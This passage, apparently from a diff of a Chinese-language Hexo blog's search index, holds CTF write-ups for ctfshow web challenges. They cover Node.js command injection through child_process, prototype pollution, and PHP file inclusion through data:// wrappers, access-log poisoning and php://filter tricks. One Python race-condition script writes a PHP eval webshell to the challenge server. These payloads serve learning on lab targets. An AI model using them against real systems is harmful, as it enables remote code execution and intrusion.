class="built_in">hex</span>(asc)</span><br><span class="line">        t = x0.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        res += <span class="string">&#x27;%25&#x27;</span>+t</span><br><span class="line">        <span class="comment">#print(res)</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>+twencode(payload))</span><br><span class="line"><span class="comment">#check it</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[-]&quot;</span>+(urllib.parse.unquote((urllib.parse.unquote(twencode(payload))))))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240316222716829.png"  alt="image-20240316222716829"></p>
-<h2 id="绕过死亡"><a href="#绕过死亡" class="headerlink" title="绕过死亡"></a>绕过死亡</h2><p>前面提到会以base64解码的形式写入，介绍一下base64解码的过程</p>
-<p>1.筛选字符，把不属于65个base64字符去掉</p>
-<p>2.解码，每四个base64字符为一组解码</p>
-<p>我们这样来操作一下<?php die('大佬别秀了');?></p>
-<p>第一步剩下phpdie</p>
-<p>第二步，由于只有6个字符，解码失败，所以我们要手动添加两个字符，给它乱解即可，反正最后执行我们的php代码即可</p>
-<p>所以payload:<code>content=aaPD9waHAgc3lzdGVtKCdscycpOzs/Pg==</code>aa是自己加的，后面的是<?php system('ls');?></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240316180606776.png"  alt="image-20240316180606776"></p>
-<p>最后再切换命令查看flag即可</p>
-<h1 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240316194352222.png"  alt="image-20240316194352222"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240316194408379.png"  alt="image-20240316194408379"></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-      </categories>
-      <tags>
+        <tag>入门</tag>
         <tag>学习</tag>
         <tag>ctfshow</tag>
+        <tag>js</tag>
       </tags>
   </entry>
   <entry>
@@ -555,80 +518,117 @@
       </tags>
   </entry>
   <entry>
-    <title>nodejs-ctfshow</title>
-    <url>/2024/03/02/nodejs-ctfshow/</url>
-    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>
+    <title>node.js原型链污染</title>
+    <url>/2024/03/11/node-js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
+    <content><![CDATA[<h1 id="好东西"><a href="#好东西" class="headerlink" title="好东西"></a>好东西</h1><span id="more"></span>
 
-<h1 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h1><p>给了两个源码文件和一个登录界面</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240303111933863.png"  alt="image-20240303111933863"></p>
-<p>前端可以看到的，以post数据提交用户名和密码，以json格式接受返回数据</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240303112015481.png"  alt="image-20240303112015481"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240303112028812.png"  alt="image-20240303112028812"></p>
-<p>这里给了用户名和密码，然后看了一下登录检验</p>
-<p>用户名不能为CTFSHOW，输入的用户名会经过<code>toUpperCase()</code>转化为大写后与数据比较，密码正常比较。</p>
-<p>既然会转化为大写，直接输入ctfshow(小写)即可</p>
-<h1 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h1><p>题面</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240303124252606.png"  alt="image-20240303124252606"></p>
-<p>信息收集</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240303124304897.png"  alt="image-20240303124304897"></p>
-<p>抓包扫描后无果</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240303124335586.png"  alt="image-20240303124335586"></p>
-<p>传入eval&#x3D;1，出现回显，推测为console.log(传参)，反正能执行我的命令并且输出</p>
-<p>在nodejs中执行系统命令我们主要是使用child_process类</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240304175348635.png"  alt="image-20240304175348635"></p>
-<p>可以看到这里有很多方法，有同步和异步创建进程的分类，我们这里需要的是异步创建进程，这里还不是很理解为什么同步创建进程不会有回显(大概是因为主程序没结束，子进程没有执行？)</p>
-<p>先看<code>execSync()</code></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240304180214603.png"  alt="image-20240304180214603"></p>
-<p>官方文档看得不是很懂，希望以后有机会研读</p>
-<p>总之应对这题，只需要一个参数command足以</p>
-<p>payload:eval&#x3D;require(‘child_process’).execSync(‘ls’)</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240304180415820.png"  alt="image-20240304180415820"></p>
-<p>发现flag文件，改命令查看即可</p>
-<h1 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h1><p>这题相比上题，ban掉了exec，所以我们用另一个spawn</p>
-<h2 id="第一种方法spwanSync"><a href="#第一种方法spwanSync" class="headerlink" title="第一种方法spwanSync()"></a>第一种方法spwanSync()</h2><p>payload1:<code>eval=require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout.toString()</code></p>
-<p>payload2:<code>eval=require(&#39;child_process&#39;).spawnSync(&#39;tac&#39;,[&#39;fl001g.txt&#39;]).stdout.toString()</code></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240305181344645.png"  alt="image-20240305181344645"></p>
-<p>学习一下<code>spawnSync()</code>方法</p>
-<p><code>spawnSync()</code>会同步创建一个子进程执行我们传入的命令，并且返回一个对象.</p>
-<h3 id="传入命令"><a href="#传入命令" class="headerlink" title="传入命令"></a>传入命令</h3><p>第一个参数是命令的名称</p>
-<p>第二个参数是一个数组，用来传递命令的参数</p>
-<h3 id="返回的对象"><a href="#返回的对象" class="headerlink" title="返回的对象"></a>返回的对象</h3><p>返回的这个对象包含命令执行后的信息</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240305182634001.png"  alt="image-20240305182634001"></p>
-<p>这里我们需要的是标准输出流stdout，并用toString()将它转化为字符串即可输出</p>
-<h2 id="第二种方法-fs类"><a href="#第二种方法-fs类" class="headerlink" title="第二种方法 fs类"></a>第二种方法 fs类</h2><h3 id="两个魔术变量"><a href="#两个魔术变量" class="headerlink" title="两个魔术变量"></a>两个魔术变量</h3><p>__filename:返回当前模块文件被解析过后的绝对路径</p>
-<p>__dirname:返回当前模块文件解析后所在的文件夹的绝对路径</p>
-<h3 id="readdirSync和readFileSync"><a href="#readdirSync和readFileSync" class="headerlink" title="readdirSync和readFileSync"></a>readdirSync和readFileSync</h3><p>payload1:<code>eval=require(&#39;fs&#39;).readdirSync(&#39;.&#39;)</code>查看当前目录下的文件</p>
-<p>payload2:<code>eval=require(&#39;fs&#39;).readFileSync(&#39;fl001g.txt&#39;,&#39;utf-8&#39;)</code>查看文件</p>
-<h3 id="exec绕过"><a href="#exec绕过" class="headerlink" title="exec绕过"></a>exec绕过</h3><p>payload:?<code>eval=require(&#39;child_process&#39;)[&#39;exe&#39;+&#39;cSync&#39;](&#39;ls&#39;).toString()</code></p>
-<p>这里有个疑点，如果我想读取上一层目录的文件该如何处理,以后再想吧</p>
-<h1 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240305201256890.png"  alt="image-20240305201256890"></p>
-<p>要求，传入两个数ab</p>
-<p>1.a的长度和b的长度一致</p>
-<p>2.a不等于b</p>
-<p>3.md5编码后的a+flag和b+flag相等</p>
-<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>这里我们的payload为a[]&#x3D;1&amp;b[]&#x3D;1</p>
-<p>1.数组.length即数组元素个数，满足相等</p>
-<p>2.JavaScript会比较等号两边数组的地址，弱不一样直接返回false(但是php不会)</p>
-<p>3.上本地测试图</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240305202533805.png"  alt="image-20240305202533805"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240305202543607.png"  alt="image-20240305202543607"></p>
-<p>ok了</p>
-<p>再看看如果数组里面有两个元素呢</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240305202622579.png"  alt="image-20240305202622579"></p>
-<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>payload:a[‘x’]&#x3D;1&amp;b[‘x’]&#x3D;1</p>
-<p>原理与上差不多相同，不过输出的东西不太同</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240305203029034.png"  alt="image-20240305203029034"></p>
-<h1 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h1><p>原型链污染</p>
-<p>移步下一篇文章</p>
+<h1 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h1><p>原型链污染其实就是围绕着两个属性做文章</p>
+<p>属性<code>__proto__</code></p>
+<p>属性<code>prototype</code></p>
+<h2 id="从用法角度介绍"><a href="#从用法角度介绍" class="headerlink" title="从用法角度介绍"></a>从用法角度介绍</h2><p>试想一些通用的方法，我们是如何调用的呢，如<code>toString()</code></p>
+<p>我们在nodejs命令执行中写过一个</p>
+<p>payload:eval&#x3D;require(‘child_process’).spawnSync(‘tac’,[‘fl001g.txt’]).stdout.toString()</p>
+<p>那时我上官网文档里查看了一下child_process类中并没有toString()方法</p>
+<p>那它哪来的呢？</p>
+<h2 id="proto-和prototype"><a href="#proto-和prototype" class="headerlink" title="__proto__和prototype"></a><code>__proto__</code>和prototype</h2><p>首先这两都是属性，都是默认内置在每个对象当中</p>
+<p>prototype指向一个原型对象，这个对象很基础，包含了很多通用的方法和属性，比如刚刚的<code>toString()</code></p>
+<p><code>__proto__</code>则指向object.prototype，实际上也是指向原型对象</p>
+<p>问题还没解答，那toString()怎么用的呢?</p>
+<p>这就要说一下prototype的一些机制，当调用一个对象中的属性和方法时，先是在对象中寻找，若有则用，若无则去prototype指向的原型的对象中去找.</p>
+<p>以下为实验</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240311164432778.png"  alt="image-20240311164432778"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240311164445047.png"  alt="image-20240311164445047"></p>
+<p>可见b对象虽为空，但还是输出了go中的2</p>
+<p>到这里理论已经形成，下面看看实战</p>
+<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h1 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h1><p>题目给了源码，快进到路由中的login.js</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240311165617963.png"  alt="image-20240311165617963"></p>
+<p>要求:让secert(作者是故意还是不小心打错的)中的ctfshow等于36dboy即可输出flag</p>
+<p>很容易就想到了原型链污染，在原型对象中注入一个ctfshow:36dboy即可</p>
+<p>那注入点在哪？</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240311170233201.png"  alt="image-20240311170233201"></p>
+<p>这里搞了个什么处理，打开utils中的common.js康康</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240311170337591.png"  alt="image-20240311170337591"></p>
+<p>真是炸炸又刚刚啊，简单介绍一下就是把我们写入的数据copy到了user对象中</p>
+<p>详细解释:</p>
+<p>1.传入两个对象，一个是user,一个是req.body,req.body由我们所控</p>
+<p>2.定义一个key不断读取req.body中的键名</p>
+<p>3.如果这个键名在user中存在，则继续调用copy，如果不存在则在则让user创建一个和key同名的键名，并且存储和req.body中相同的键值</p>
+<p>4.key读完了自动就跳出循环了</p>
+<p>抓个包看看它咋写</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240311171328658.png"  alt="image-20240311171328658"></p>
+<p><code>payload:&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;</code></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240311172433837.png"  alt="image-20240311172433837"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240311172445135.png"  alt="image-20240311172445135"></p>
+<p>带出来了</p>
 ]]></content>
       <categories>
         <category>学习</category>
       </categories>
       <tags>
-        <tag>入门</tag>
+        <tag>学习</tag>
+        <tag>js</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含漏洞</title>
+    <url>/2024/03/13/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>开</p>
+<span id="more"></span>
+
+<h1 id="web-79"><a href="#web-79" class="headerlink" title="web 79"></a>web 79</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240313101524315.png"  alt="image-20240313101524315"></p>
+<p><code>file=data://plain/text,&lt;?= &#39;tac flag.php&#39;?&gt;</code><?echo 1?>等于<?= 1?>,需要打开short_open_tag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===&gt; &lt;?php system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h1 id="web-80"><a href="#web-80" class="headerlink" title="web 80"></a>web 80</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240313111931278.png"  alt="image-20240313111931278"></p>
+<p>新姿势，包含目录文件</p>
+<p>目录文件会记录我们的ua，浏览器的一些信息，那我们在ua插入php代码，再让include包含并执行，就可以getshell，先包含</p>
+<p>Nginx:&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+<p>Apache:&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log</p>
+<p>或许还可以试试有没有error.log</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240313111318671.png"  alt="image-20240313111318671"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240313111708459.png"  alt="image-20240313111708459"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240313111721356.png"  alt="image-20240313111721356"></p>
+<p>得吃</p>
+<p>当然你也可以让file包含你服务器的木马文件，然后直接上线它的服务器也可以</p>
+<h1 id="web-81"><a href="#web-81" class="headerlink" title="web 81"></a>web 81</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240313111952192.png"  alt="image-20240313111952192"></p>
+<p>多过滤了一个:</p>
+<p>和上题一样，不能请求自己服务器的木马而已</p>
+<h1 id="web-82-86"><a href="#web-82-86" class="headerlink" title="web 82-86"></a>web 82-86</h1><p><a href="https://blog.csdn.net/qq_46918279/article/details/120106832">CTFSHOW-文件包含_highlight_file(<strong>file</strong>);-CSDN博客</a></p>
+<p>进行一个新知识的学</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"> </span><br><span class="line">url=<span class="string">&#x27;http://08d4a04e-19b3-4049-8a81-e9c6226eee2f.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"><span class="comment">#设置PHPSESSID的值</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span>     </span><br><span class="line">data=&#123;<span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/tao.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span>&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#为了进行条件竞争，需要一边写一边读</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#进行上传文件时需要post传递名为PHP_SESSION_UPLOAD_PROGRESS值为一句话木马</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">	fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)          <span class="comment">#生产一个50k的文件</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(url,</span><br><span class="line">			data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">			cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid&#125;,</span><br><span class="line">			files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)&#125;    <span class="comment">#设置文件名字和内容</span></span><br><span class="line">			)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#读取session文件，这里文件为/tmp/sess_ctfshow</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data)</span><br><span class="line">		response2=session.get(url+<span class="string">&#x27;tao.php&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span> response2.status_code==<span class="number">200</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;++++++++++++++++++++&#x27;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(response2.status_code)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> </span><br><span class="line">	<span class="comment">#开启多线程进行竞争	</span></span><br><span class="line">	evnet=threading.Event()</span><br><span class="line">	<span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:			</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">			threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">			threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">	evnet.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="web-87"><a href="#web-87" class="headerlink" title="web 87"></a>web 87</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240316125758740.png"  alt="image-20240316125758740"></p>
+<p>这题目的是写入木马，并成功执行木马</p>
+<p>分析一波:</p>
+<p>这里的文件名中不能有php，data，：，.</p>
+<p>并且木马写上去后还会先执行死亡程序，不会执行木马</p>
+<p>该怎么做</p>
+<p>先要了解一下<code>php://filter/write=convert.base64-decode/resouce=flag.php</code></p>
+<p>这里是打开一个中间流，如果我们在文件名那里写上这个的话，那么<code>file_put_contents()</code>会这样做，把第二个参数的值以base64解码，并且写到flag.php文件中，接下来就介绍如何突破限制</p>
+<h2 id="文件名"><a href="#文件名" class="headerlink" title="文件名"></a>文件名</h2><p>既然我们要写上上面的payload，那么该如何绕过，可以看到下面还有一层url解码，所以这里可以双重url编码绕过，自己用python写了个脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">payload = <span class="built_in">input</span>(<span class="string">&quot;your payload:[+]&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">twencode</span>(<span class="params">payload</span>):</span><br><span class="line">    res=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    chars = <span class="built_in">list</span>(payload)</span><br><span class="line">    length = <span class="built_in">len</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        asc = <span class="built_in">ord</span>(char)</span><br><span class="line">        x0 = <span class="built_in">hex</span>(asc)</span><br><span class="line">        t = x0.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        res += <span class="string">&#x27;%25&#x27;</span>+t</span><br><span class="line">        <span class="comment">#print(res)</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>+twencode(payload))</span><br><span class="line"><span class="comment">#check it</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[-]&quot;</span>+(urllib.parse.unquote((urllib.parse.unquote(twencode(payload))))))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240316222716829.png"  alt="image-20240316222716829"></p>
+<h2 id="绕过死亡"><a href="#绕过死亡" class="headerlink" title="绕过死亡"></a>绕过死亡</h2><p>前面提到会以base64解码的形式写入，介绍一下base64解码的过程</p>
+<p>1.筛选字符，把不属于65个base64字符去掉</p>
+<p>2.解码，每四个base64字符为一组解码</p>
+<p>我们这样来操作一下<?php die('大佬别秀了');?></p>
+<p>第一步剩下phpdie</p>
+<p>第二步，由于只有6个字符，解码失败，所以我们要手动添加两个字符，给它乱解即可，反正最后执行我们的php代码即可</p>
+<p>所以payload:<code>content=aaPD9waHAgc3lzdGVtKCdscycpOzs/Pg==</code>aa是自己加的，后面的是<?php system('ls');?></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240316180606776.png"  alt="image-20240316180606776"></p>
+<p>最后再切换命令查看flag即可</p>
+<h1 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240316194352222.png"  alt="image-20240316194352222"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240316194408379.png"  alt="image-20240316194408379"></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
         <tag>学习</tag>
         <tag>ctfshow</tag>
-        <tag>js</tag>
       </tags>
   </entry>
 </search>
